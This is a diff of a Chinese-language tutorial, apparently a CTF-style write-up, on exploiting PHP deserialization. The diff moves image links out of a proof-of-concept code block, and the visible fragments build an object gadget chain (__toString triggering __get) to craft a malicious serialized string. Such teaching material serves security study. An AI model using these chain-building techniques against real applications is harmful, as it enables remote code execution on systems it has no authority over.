@@ -134,6 +134,16 @@ public function fun() {
 根据上面分析出的链条和条件，我们可以编写PHP代码来构造恶意的序列化字符串。
 
 以下是构造POC（Proof of Concept）的示例代码：
+
+![](img/30cefdd004a953effe13addb60eb915e_40.png)
+
+![](img/30cefdd004a953effe13addb60eb915e_42.png)
+
+![](img/30cefdd004a953effe13addb60eb915e_44.png)
+
+
+![](img/30cefdd004a953effe13addb60eb915e_46.png)
+
 ```php
 <?php
 class works {
@@ -147,13 +157,6 @@ class works {
 class do {
     public $str;
 }
-
-![](img/30cefdd004a953effe13addb60eb915e_40.png)
-
-![](img/30cefdd004a953effe13addb60eb915e_42.png)
-
-![](img/30cefdd004a953effe13addb60eb915e_44.png)
-
 class peal {
     public $sand;
     public $cmd;
@@ -166,9 +169,6 @@ $works = new works();
 $peal = new peal();
 $peal->sand = ‘str’; // 这个值会被用于数组键名
 $peal->cmd = array(‘str’ => $works); // 使 $peal->cmd[‘str’] 为 $works 对象
-
-![](img/30cefdd004a953effe13addb60eb915e_46.png)
-
 // 3. 创建 $do1 对象，使其 __toString 方法能触发 $peal 的 __get
 $do1 = new do();
 $do1->str = array(‘str’ => $peal); // 使 $do1->str[‘str’] 为 $peal 对象
